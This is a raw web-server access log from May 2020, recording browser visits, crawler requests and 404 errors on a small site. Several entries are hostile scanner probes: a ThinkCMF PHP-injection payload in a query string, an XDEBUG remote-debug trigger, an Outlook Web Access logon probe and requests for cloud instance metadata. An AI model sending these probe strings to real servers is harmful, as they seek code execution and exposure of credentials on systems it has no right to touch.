[33mStarting up http-server, serving [39m[36m./[39m[33m through[39m[36m https[39m[33m[39m
[33mAvailable on:[39m
  https://127.0.0.1:[32m443[39m
  https://172.31.27.136:[32m443[39m
Hit CTRL-C to stop the server
[Wed May 13 2020 20:32:41 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Wed May 13 2020 20:32:41 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Wed May 13 2020 20:32:50 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Wed May 13 2020 20:32:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Wed May 13 2020 20:32:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Wed May 13 2020 20:48:39 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
[Wed May 13 2020 20:48:39 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
[Wed May 13 2020 20:48:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
[Wed May 13 2020 20:48:40 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
[Wed May 13 2020 20:48:40 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Wed May 13 2020 21:20:12 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "undefined"
[Wed May 13 2020 23:58:03 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Thu May 14 2020 00:40:52 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
[Thu May 14 2020 00:58:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Thu May 14 2020 00:58:58 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Thu May 14 2020 00:58:59 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Thu May 14 2020 00:59:01 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Thu May 14 2020 00:59:01 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 00:59:02 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Thu May 14 2020 00:59:02 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 01:01:38 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Thu May 14 2020 01:40:55 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
[Thu May 14 2020 01:56:25 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Thu May 14 2020 02:40:11 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Thu May 14 2020 04:19:09 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
[Thu May 14 2020 04:29:52 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 04:29:53 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 04:29:53 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:04:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:04:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:04:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:19:15 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:19:15 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:19:15 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:19:19 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:19:19 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 05:21:00 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:21:00 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:21:00 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:21:00 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:21:00 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 05:33:25 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Thu May 14 2020 05:40:03 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 05:40:03 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 06:44:38 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Thu May 14 2020 08:06:15 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 08:06:15 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 08:35:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 08:35:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 08:35:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 08:35:23 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 08:50:05 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Thu May 14 2020 08:50:05 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Thu May 14 2020 08:58:44 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Thu May 14 2020 12:08:27 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Thu May 14 2020 12:08:28 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Thu May 14 2020 12:08:29 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Thu May 14 2020 12:08:30 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Thu May 14 2020 12:08:30 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 12:08:31 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Thu May 14 2020 12:08:31 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 12:58:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" "Mozilla/5.0 zgrab/0.x"
[Thu May 14 2020 12:58:57 GMT+0000 (UTC)]  "[31mGET[39m [31m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 13:23:43 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36 "
[Thu May 14 2020 13:47:55 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Thu May 14 2020 14:11:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Thu May 14 2020 14:11:51 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 14:11:52 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/?s={search_term_string}[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Thu May 14 2020 14:11:52 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/?s={search_term_string}[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 14:13:13 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/feed/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Thu May 14 2020 14:13:13 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/feed/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 14:14:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/consultants/start-up-funding-understand-all-about-moving-forward/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Thu May 14 2020 14:14:46 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/consultants/start-up-funding-understand-all-about-moving-forward/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 14:50:35 GMT+0000 (UTC)]  "[36mOPTIONS[39m [36m/[39m" "undefined"
[Thu May 14 2020 14:50:35 GMT+0000 (UTC)]  "[31mOPTIONS[39m [31m/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 15:47:55 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Thu May 14 2020 16:53:10 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 16:53:10 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 16:53:10 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 16:53:10 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Thu May 14 2020 16:53:10 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 18:13:53 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
[Thu May 14 2020 19:11:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Thu May 14 2020 19:11:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Thu May 14 2020 19:23:20 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Thu May 14 2020 19:26:59 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Thu May 14 2020 20:42:56 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 20:42:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 20:42:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 20:42:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 20:42:57 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 20:42:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
[Thu May 14 2020 21:07:49 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/category/webinar/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Thu May 14 2020 21:07:49 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/category/webinar/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 21:12:50 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/category/trading-business/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Thu May 14 2020 21:12:50 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/category/trading-business/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Thu May 14 2020 21:55:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
[Fri May 15 2020 00:12:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "undefined"
[Fri May 15 2020 00:15:26 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
[Fri May 15 2020 01:18:53 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Fri May 15 2020 01:18:54 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Fri May 15 2020 01:18:55 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Fri May 15 2020 01:18:56 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Fri May 15 2020 01:18:56 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 01:18:57 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Fri May 15 2020 01:18:57 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 01:23:11 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Fri May 15 2020 02:17:17 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Fri May 15 2020 02:31:34 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Fri May 15 2020 02:38:03 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Fri May 15 2020 02:52:20 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Fri May 15 2020 03:56:09 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Fri May 15 2020 03:56:09 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Fri May 15 2020 04:19:28 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Fri May 15 2020 05:59:21 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 zgrab/0.x"
[Fri May 15 2020 08:21:47 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Fri May 15 2020 10:32:21 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
[Fri May 15 2020 10:32:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/heatmap.js[39m" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
[Fri May 15 2020 10:32:22 GMT+0000 (UTC)]  "[36mGET[39m [36m/gaze.js[39m" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
[Fri May 15 2020 10:32:24 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
[Fri May 15 2020 10:32:24 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:48:47 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:48:47 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:48:48 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/blog/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:48:48 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/blog/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:49:16 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:49:16 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:49:50 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/login-customizer/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:49:50 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/login-customizer/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:50:24 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/category/consultants/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:50:24 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/category/consultants/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:50:58 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/author/admin/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:50:58 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/author/admin/[39m" Error ([31m404[39m): "[31mNot found[39m"
[Fri May 15 2020 12:51:31 GMT+0000 (UTC)]  "[36mGET[39m [36m/blog/webinar/webinar-restaurants-food-industry/[39m" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
[Fri May 15 2020 12:51:31 GMT+0000 (UTC)]  "[31mGET[39m [31m/blog/webinar/webinar-restaurants-food-industry/[39m" Error ([31m404[39m): "[31mNot found[39m"
